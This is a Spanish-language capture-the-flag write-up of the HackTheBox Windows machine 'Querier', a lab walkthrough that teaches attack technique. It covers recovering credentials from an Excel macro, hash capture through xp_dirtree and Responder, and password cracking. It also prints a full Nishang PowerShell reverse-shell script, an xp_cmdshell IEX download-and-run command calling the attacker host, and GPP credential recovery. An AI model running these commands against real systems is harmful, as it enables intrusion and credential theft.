---
layout      : post
title       : "Maquina Querier - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Querier/querier.webp
category    : [ hackthebox ]
tags        : [ cached gpp, shared files, abussingmysql, macroinspection, Active Directory ]
---

El dia de hoy vamos a estar resolviendo la maquina `Querier` de `hackthebox` que es una `Windows` de dificultad `Media`. Comenzaremos enumerando los recursos compartidos `smb` para obtener la contraseña de un usuario, informando que puede iniciar sesión en el `mssql-server`. Para obtener el usuario en el sistema, podemos robar el hash del usuario `mssql-svc` ejecutando el comando `xp_dirtree` y finalmente para la escalada de privilegios al administrador que es bastante sencilla aprovecharemos el script `powerup.ps1` de powersploit para obtener las credenciales administrativas alojadas en un archivo `xml`.


Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Querier
❯ ls
 Querier
```

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## Enumeración [#](#enumeración) {#enumeración}
 

Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.125
PING 10.10.10.125 (10.10.10.125) 56(84) bytes of data.
64 bytes from 10.10.10.125: icmp_seq=1 ttl=127 time=137 ms

--- 10.10.10.125 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 137.483/137.483/137.483/0.000 ms
```
Vemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de `nmap`:


### Escaneo de Puertos

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `allPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.125 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-25 14:23 GMT
Initiating SYN Stealth Scan at 14:23
Scanning 10.10.10.125 [65535 ports]
Discovered open port 135/tcp on 10.10.10.125
Discovered open port 139/tcp on 10.10.10.125
Discovered open port 445/tcp on 10.10.10.125
Discovered open port 49664/tcp on 10.10.10.125
Discovered open port 49665/tcp on 10.10.10.125
Discovered open port 49670/tcp on 10.10.10.125
Discovered open port 47001/tcp on 10.10.10.125
Discovered open port 49668/tcp on 10.10.10.125
Discovered open port 49666/tcp on 10.10.10.125
Discovered open port 49667/tcp on 10.10.10.125
Discovered open port 1433/tcp on 10.10.10.125
Discovered open port 49669/tcp on 10.10.10.125
Discovered open port 49671/tcp on 10.10.10.125
Discovered open port 5985/tcp on 10.10.10.125
Completed SYN Stealth Scan at 14:23, 19.31s elapsed (65535 total ports)
Nmap scan report for 10.10.10.125
Host is up, received user-set (0.11s latency).
Scanned at 2023-03-25 14:23:13 GMT for 19s
Not shown: 65090 closed tcp ports (reset), 431 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
1433/tcp  open  ms-sql-s     syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
49670/tcp open  unknown      syn-ack ttl 127
49671/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.47 seconds
           Raw packets sent: 95410 (4.198MB) | Rcvd: 82570 (3.303MB)
```
Podemos ver puertos interesantes que se encuentran abiertos como `135 rpc` , `139 ldap` , `445 smb` , `1433 mssql` y `5985 winrm`.

### Escaneo de Version y Servicios.

```java
❯ nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.10.10.125 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-25 14:26 GMT
Nmap scan report for 10.10.10.125
Host is up (0.44s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-03-25T14:21:57
|_Not valid after:  2053-03-25T14:21:57
|_ssl-date: 2023-03-25T14:27:31+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time: 
|   date: 2023-03-25T14:27:20
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.96 seconds
```
Visulizamos informacion interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 135     | RPC      | Microsoft Windows RPC |
| 139   | LDAP     | Microsoft Windows netbios-ssn |
| 445   | SMB      | ? |
| 1433   | MSSQL-S | Microsoft SQL Server 2017 14.00.1000.00; RTM |
| 5985   | WINRM | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |



Ya que vemos que el puerto 445 esta abierto procederemos a enumerarlo, usaremos la herramienta crackmapexec:

```bash
❯ crackmapexec smb 10.10.10.125
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
```

Vamos a buscar si hay recursos compartidos a los que podemos acceder, para ello podemos hacer uso de smbmap con los parametros `-H` para especificar el host y `-u` para hacer uso de una sesion nula.

```bash
❯ smbmap -H 10.10.10.125 -u 'null'
[+] Guest session   	IP: 10.10.10.125:445	Name: 10.10.10.125                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	Reports                                           	READ ONLY	
```
Despues de ver que si podemos listar los recursos compartidos, vemos uno interesante con el nombre de `Reports` vamos a ingresar en el para ver su contenido, añadiremos para eso el parametro '-r' y el nombre del recurso:

```bash
❯ smbmap -H 10.10.10.125 -u 'null' -r Reports
[+] Guest session   	IP: 10.10.10.125:445	Name: 10.10.10.125                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Reports                                           	READ ONLY	
	.\Reports\*
	dr--r--r--                0 Mon Jan 28 23:26:31 2019	.
	dr--r--r--                0 Mon Jan 28 23:26:31 2019	..
	fr--r--r--            12229 Mon Jan 28 23:26:31 2019	Currency Volume Report.xlsm
```


Dentro existe un archivo con la extension `xlsm`, asi que vamos a descargarnoslo y renombrar el archivo a un nombre mas comodo:

```bash
❯ smbmap -H 10.10.10.125 -u 'null' --download "Reports\Currency Volume Report.xlsm"
[+] Starting download: Reports\Currency Volume Report.xlsm (12229 bytes)
[+] File output to: /home/fmiracle/Machines/Querier/content/10.10.10.125-Reports_Currency Volume Report.xlsm
❯ ls
 10.10.10.125-Reports_Currency Volume Report.xlsm
❯ mv 10.10.10.125-Reports_Currency\ Volume\ Report.xlsm Report.xlsm
❯ ls
 Report.xlsm
```

## Explotación [#](#explotación) {#explotación}

Como es un archivo `xlsm` trataremos con el comando `strings` lista del archivo algunos caracteres legibles:


```bash
❯ strings Report.xlsm
[Content_Types].xml 
apP<*
Fi+i
d|}5
o=`Fh
O(%$
_rels/.rels 
BKwAH
GJy(v
USh9i
```


Al no ver informacion interesante, vamos a utilizar un herramienta de github llamada `olebva`:

* [Olevba](https://github.com/decalage2/oletools/wiki/olevba).

Esta herramienta nos permite analizar archivos `OLE` y `OpenXML`, como documentos de `MS Office` para poder detectar macros en texto claro.


Ejecutamos la herramienta pasandole el archivo `xlsm` y esta nos parsea la informacion donde podemos ver un `usario` y `contraseña`:
```bash
❯ olevba Report.xlsm
olevba 0.60 on Python 3.9.2 - http://decalage.info/python/oletools
===============================================================================
FILE: Report.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

Vamos a proceder a verificar si las credenciales son validas para ello usaremos `crackmapexec`:

```bash
❯ crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d WORKGROUP
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\reporting:PcwTWTHRwryjc$c6 
```

Como tenemos credenciales validas, podemos tratar de conectarnos al servicio `mssql` que vimos antes, para ello usaremos la herramienta `mssqlclient.py` que viene incluida en la suite de `impacket`:

* [https://github.com/fortra/impacket](https://github.com/fortra/impacket)

Especificamos tal como nos indica el uso de la herramienta el `dominio`, `usuario`, `contraseña` y adicionamos el parametro `-windows-auth` el cual permite utilizar o no la autenticación de Windows ``(por defecto False)`` 

```bash
❯ mssqlclient.py WORKGROUP/reporting@10.10.10.125 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands SQL>
```

Una vez conectados al servicio lo que intentaremos hacer es usar `xp_cmdshell` para tratar de ejecutar comandos, pero vemos que el usuario `reporting` no cuenta con los privilegios suficientes:


```bash
SQL> xp_cmdshell 'whoami'
[-] ERROR(QUERIER): Line 1: Incorrect syntax near 'whoami'.
SQL> sp_configure 'show_advance', 1
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
SQL> sp_configure 'xp_cmdshell', 1
[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
SQL> sp_configure 'show_advance', 1
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
SQL> reconfigure
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL>
```
Probaremos a tratar de lanzar una conexion con el comando `xp_dirtree` para tratar de realizar una conexion a un recurso compartido que alojare en mi maquina y mientras el servidor trata de auntenticarse a mi maquina, con `responder` intentare capturar el hash ` Net-NTLMv2`.

```bash
-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL> xp_dirtree "\\10.10.16.4\test"
subdirectory                                                                                                                                                                                                                                                            depth   

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------   

SQL> 
```

```bash
❯ responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
[+] HTTP Options:
           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
    Serving EXE                [OFF]
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoning Options:
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]
    Fingerprint hosts          [OFF]
[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.4]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-LBGCELK616Y]
    Responder Domain Name      [68T9.LOCAL]
    Responder DCE-RPC Port     [49780]

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:ba540bb74f74294f:4BD001461E512C70BDF3EEB128106707:0101000000000000808ED3322E5FD901A773108D6C1BE5000000000002000800360038005400390001001E00570049004E002D004C0042004700430045004C004B00360031003600590004003400570049004E002D004C0042004700430045004C004B0036003100360059002E0036003800540039002E004C004F00430041004C000300140036003800540039002E004C004F00430041004C000500140036003800540039002E004C004F00430041004C0007000800808ED3322E5FD90106000400020000000800300030000000000000000000000000300000E9065E16CEFD1E276185F5DFA30A232F59D4C33E5CD80DC5D131A1B67AEAE4F60A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003400000000000000000000000000
```
Obtuvimos un hash correspondiente al usario `mssql-svc` el cual trataremos de crackearlo con `john`:

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
1g 0:00:00:37 DONE (2023-03-25 15:30) 0.02700g/s 241965p/s 241965c/s 241965C/s correforenz..cornamuckla
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

`John` logra obtener la contraseña en texto claro y ahora contamos con nuevas credenciales que podemos probar:

* usuario: mssql-svc 
* password: corporate568

Volvemos a validar la contraseña con `crackmapexec`y efectivamente son validas:

```bash
❯ crackmapexec smb 10.10.10.125 -u 'mssql-svc' -p 'corporate568' -d WORKGROUP
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\mssql-svc:corporate568
```

Ya que ahora disponemos de credenciales del usuario `mssql-svc` quiero pensar que me puedo conectar con `mssqlclient.py` y que este contara con mayores privilegios y esta vez si que podremos ejecutar comandos:

```bash
Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> sp_configure 'xp_cmdshell', 1
[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
SQL> sp_configure 'show_advanced', 1
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure
SQL> sp_configure 'xp_cmdshell', 1
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure
SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

querier\mssql-svc                                                                  

NULL                                                                               

SQL>
```


Esta vez si conseguimos ejecutar comandos, lo siguiente sera ganar acceso con una consola en powershell y movernos mas comodamente desde nuestra maquina victima, y para ello usaremos `
Invoke-PowerShellTcp.ps1 ` del repositorio de `Nishang`:

* [Nishang](https://github.com/samratashok/nishang).

Editaremos la linea final del script y al ejecutarlo con `Iex` nos interprete el script incluida la linea final de ese modo matamos dos pajaros de un tiro:

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.4 -Port 443
```

Seguidamente procedemos a montarnos un servidor local con python donde alojaremos el script `Invoke-PowerShellTcp.ps1`:

```bash
❯ ls
 Invoke-PowerShellTcp.ps1   Report.xlsm
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Ejecutamos la instruccion con `xp_cmdshell`:

```bash
SQL> xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.16.4/Invoke-PowerShellTcp.ps1\")"
```
Nos ponemos en escucha con `ncat` en puerto `443` y ganamos acceso al sistema:

```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.125.
Ncat: Connection from 10.10.10.125:49681.
Windows PowerShell running as user mssql-svc on QUERIER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
querier\mssql-svc
PS C:\Windows\system32>
```

AHora vamos al directorio personal del usuario y visializamos la primera flag `user.txt`:

```bash
PS C:\Windows\system32>cd C:\Users\
PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/28/2019  10:17 PM                Administrator                                                         
d-----        1/28/2019  11:42 PM                mssql-svc                                                             
d-r---        1/28/2019  10:17 PM                Public                                                                


PS C:\Users> cd mssql-svc
PS C:\Users\mssql-svc> cd Desktop
PS C:\Users\mssql-svc\Desktop> type user.txt
089b86d375c2a51f4aae02b9a984a9ee
```

## Escalada de Privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Una vez dentro ejecutamos el comando `whoami /priv` y vemos que tenemos activado el `SeImpersonatePrivilege`

```bash
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Podriamos utilizar `JuicyPotato`, pero esta vez vamos a usar `PowerUp.ps1` de `powersploit` para enumerar el sistema.


Nos volvemos a compartir un servidor web con `python3`:

```bash
❯ ls
 Invoke-PowerShellTcp.ps1   PowerUp.ps1   Report.xlsm
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

y ejecutamos con `Iex` la instraccion para ejecutar e interpretar el script en la maquina victima y hacer un reconocimiento total:

```bash
PS C:\Windows\system32> Iex(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerUp.ps1')
```

Una vez ejecutado esperamos un poco y el sistema nos enumera unas credenciales Administrativas del archivo `Groups.xml`.

```bash
PS C:\Windows\system32> Iex(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerUp.ps1')


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2468
ProcessId   : 3744
Name        : 3744
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```

Vamos a proceder a validar si las credenciales corresponden al usuario `Administrador` y efectivamente asi es:

```bash
❯ crackmapexec smb 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUP
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\Administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)
```

Ahora podemos hacer uso del puerto `5985` servicio de administracion remota de windows con la ayuda de `evil-winrm` nos dirigimos al directorio del usuario `Administrator` y podemos visualiar la segunda flag `root.txt` :).


```bash
❯ evil-winrm -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -i 10.10.10.125

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
6d6c9abc4b5ecfaf4587047710b1bbb3
```

